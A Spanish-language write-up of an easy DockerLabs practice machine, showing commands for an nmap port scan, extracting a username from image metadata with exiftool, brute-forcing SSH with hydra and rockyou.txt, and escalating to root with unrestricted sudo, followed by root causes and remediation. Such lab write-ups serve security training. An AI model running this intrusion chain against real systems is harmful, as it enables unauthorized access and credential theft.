Writeup: Máquina DockerLabs (ExifTool, Hydra & Sudo)


​Plataforma: DockerLabs


Dificultad: Fácil


Fecha: 2 de Noviembre, 2026


Objetivo: Obtener acceso con privilegios de administrador (root).


​1. Resumen Ejecutivo


​El objetivo de la auditoría consistió en comprometer el entorno controlado de DockerLabs a través de la siguiente cadena de explotación:




​Escaneo de puertos y descubrimiento de servicios activos (SSH y HTTP).


​Inspección del servidor web y análisis de metadatos en recursos multimedia mediante exiftool para la extracción de nombres de usuario.



​Ataque de fuerza bruta con hydra sobre el servicio SSH para obtener acceso inicial como usuario borazuwarah.




​Escalada de privilegios a través de la asignación permisiva de sudo para obtener acceso directo de superusuario (root).





​2. Reconocimiento y Enumeración


​Escaneo de Puertos (Nmap)


​Se realizó un escaneo completo de puertos hacia la dirección IP del objetivo (172.17.0.3):

sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.3

Resultado del escaneo:




​22/tcp (SSH): OpenSSH activo.


​80/tcp (HTTP): Servidor Web Apache activo.




​Nota: Tras verificar intentos previos hacia el puerto 445 (SMB), se confirmó que se encontraba cerrado (NT_STATUS_CONNECTION_REFUSED), por lo que el vector de entrada principal se enfocó en el servicio web.


​Enumeración Web e Inspección de Recursos


​Al acceder a la raíz del servidor web (http://172.17.0.3/), se identificó una imagen expuesta (imagen.jpeg / Huevo Kinder). Se procedió a descargar el archivo para su análisis offline:

cd ~/Descargas
exiftool imagen.jpeg

Mediante la extracción de metadatos se identificó con éxito el usuario válido: borazuwarah (campo de contraseña vacío).


​3. Acceso Inicial (Intrusión)


​Con el nombre de usuario identificado (borazuwarah), se ejecutó un ataque de fuerza bruta sobre el servicio SSH (puerto 22) empleando hydra y el diccionario rockyou.txt:

hydra -l borazuwarah -P rockyou.txt ssh://172.17.0.3 -f



información relevante 

Description                     : User: borazuwarah
Title                           : Password:

Credencial obtenida:





​Usuario: borazuwarah




​Contraseña: 123456





​4. Escalada de Privilegios (Root)


​Acceso SSH


​Se estableció la sesión remota por SSH utilizando las credenciales obtenidas:

ssh borazuwarah@172.17.0.3

Elevación a Root


​Una vez dentro del sistema, se procedió a verificar la elevación de privilegios ejecutando:

sudo su

Verificación de Acceso


​Se confirmó la obtención exitosa del acceso de superusuario:

whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)

Al inspeccionar la carpeta /root, se confirmó que la máquina no cuenta con archivos de comprobación root.txt o flag.txt.


​5. Conclusión y Remediación





​Causa Raíz:



​Inclusión de información sensible y nombres de usuario del sistema dentro de los metadatos de archivos multimedia públicos.


​Uso de contraseñas extremadamente débiles (123456) en cuentas con acceso SSH.



​Permisos de sudo ilimitados asignados al usuario borazuwarah sin restricciones.








​Remediación:



​Sanitizar todos los recursos multimedia expuestos en servidores web eliminando sus metadatos (exiftool -all=).


​Implementar políticas de contraseñas robustas e imponer el uso de autenticación basada en llaves SSH.


​Aplicar el principio de menor privilegio en el archivo




/etc/sudoers.
















